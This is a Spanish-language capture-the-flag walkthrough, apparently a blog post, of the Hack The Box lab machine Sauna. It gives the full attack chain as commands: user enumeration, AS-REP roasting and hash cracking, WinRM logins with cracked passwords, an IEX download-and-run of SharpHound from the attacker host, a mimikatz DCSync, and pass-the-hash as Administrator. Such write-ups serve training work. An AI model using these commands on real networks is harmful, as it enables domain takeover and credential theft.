---
layout: post
title: HTB_Sauna
date: 2023/07/10
slug: HTB_Sauna
heroImage: /assets/machines.jpg
---

# Sauna {-}

## Introduccion {-}

La maquina del dia se llama Sauna.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/H5m72jyuy84/0.jpg)](https://www.youtube.com/watch?v=H5m72jyuy84)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.175
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.175
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,80,88,135,139,289,445,464,593,636,3269,5985,9389,49667,49673,49674,49677,49689,49698 10.10.10.175 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 80     | http       | WebFuzzin                                |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49673  | msrpc      | Puertos por defecto de windows           |                           |
| 49673  | msrpc      | Puertos por defecto de windows           |                           |
| 49674  | ncacn_http | Puertos por defecto de windows           |                           |
| 49677  | msrpc      | Puertos por defecto de windows           |                           |
| 49689  | msrpc      | Puertos por defecto de windows           |                           |
| 49698  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.175
smbclient -L 10.10.10.175 -N
smbmap -H 10.10.10.175 -u 'null'
```

Vemos que estamos frente de una maquina Windows 10 que se llama **SAUNA** en el dominio **EGOTISTICAL-BANK.LOCAL** con un certificado firmado.
Añadimos el dominio al 
```bash
 /etc/hosts 
```
.
Tambien vemos que no podemos ver los recursos compartidos a nivel de red con un null session.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.175 -N

rpcclient $> enumdomusers
```

Podemos conectar pero no nos deja ver usuarios del directorio activo.


### Kerbrute {-}

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
./kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.175
```

Es un IIS 10.0

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.175 
```
, Vemos una pagina Egotistical Bank. Navegando por el 
```bash
 about.html 
```
 vemos usuarios potenciales. Vamos a recuperarlos
con bash

```bash
curl -s -X GET "http://10.10.10.175/about.html"
curl -s -X GET "http://10.10.10.175/about.html" | grep "p class=\"mt-2"
curl -s -X GET "http://10.10.10.175/about.html" | grep "p class=\"mt-2" | grep "Fergus Smith" -A 100 | html2text > users
```

Modificamos el fichero users para crear nombres de usuarios como 
```bash
 fsmith 
```
,
```bash
 f.smith 
```
,
```bash
 frank.smith 
```
, 
```bash
 smithf 
```
, 
```bash
 smith.frank 
```
 o otros y intentamos un asproasting attack.
## Vulnerability Assessment {-}

### Asproasting {-}

```bash
GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users
```

Aqui vemos un hash para el usuario 
```bash
 fsmith 
```
. Lo copiamos en un fichero 
```bash
 fsmith_hash 
```
 y intentamos romperlo con john.

### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt fsmith_hash
```

Validamos el usuario con crackmap exec

```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

El usuario es valido pero no tenemos un Pwn3d. Checkeamos si es valido con winrm

```bash
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```

Ademas de ser valido, aqui no pone un Pwn3d! que significa que podemos conectarnos con Evil-WinRM.
## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.
## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
```

No tenemos ningun privilegio interessante, tenemos que reconocer el systema.

1. Creamos un directorio para trabajar

    ```powershell
    cd C:\Windows\Temp
    mkdir Recon
    cd Recon
    ```

1. En la maquina de atacante no descargamos el WinPeas

    ```bash
    wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe
    mv winPEASx64.exe winPEAS.exe
    ```

1. Lo uploadeamos desde la maquina victima y lo lanzamos

    ```powershell
    upload winPEAS.exe
    ./winPEAS.exe


    ```

    Aqui hemos encontrado unas credenciales para un autologon.

1. Validamos el usuario desde la maquina de atacante

    ```bash
    crackmapexec win rm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    ```

1. Nos conectamos nuevamente con **Evil-WinRM**

    ```bash
    evil-winrm -i 10.10.10.275 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    whoami
    whoami /priv
    whoami /all
    ```

    Nuevamente no encontramos nada muy interesante. Aqui tenemos que tirar de bloodhound

1. En la maquina de atacante preparamos el bloodhound

    ```bash
    sudo apt install neo4j bloodhound -y
    neo4j console

    bloodhoud &> /dev/null & disown

    wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
    python -m http.server 80
    ```

1. Recolectamos data desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir privesc
    cd privesc
    IEX(New-Object Net.WebClient).downloadString('http://10.10.17.51/SharpHound.ps1')
    Invoke-BloodHound -CollectionMethod All
    dir
    download 20210908210119_BloodHound.zip
    ```

Una vez el zip en la maquina de atacante, lo cargamos al BloodHound. Cargado vamos a la pestaña Analysis y 
miramos por 
```bash
 Find Shortest Paths to Domain Admins 
```
 pero no vemos gran cosa. Miramos el 
```bash
 Find Principals with DCSync Rights 
```

y vemos que el usuario **svc_loanmgr** tiene privilegios *GetChanges* y *GetChangesAll* sobre el dominio **EGOTISTICAL-BANK.LOCAL**.
Esto significa que podemos hacer un DCSync attack con este usuario.

#### DCSync Attack con mimikatz {-}

Buscamos el mimikatz en nuestra maquina de atacante

```bash
locate mimikatz.exe
cp /usr/share/mimikatz/x64/mimikatz.exe .
python -m http.server 80
```

Lo descargamos en la maquina victima y lo lanzamos para extraer el hash del usuario Administrator.

```powershell
iwr -uri http://10.10.17.51/mimikatz.exe -OutFile mimikatz.exe
C:\Windows\Temp\privesc\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
```

Ahora que hemos recuperado el Hash NTLM del usuario Administrator, podemos hacer un **pass the hash**.

```bash
evil-winrm -i 10.10.10.175 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e
```

Ya somos usuario Administrator y podemos leer la flag.
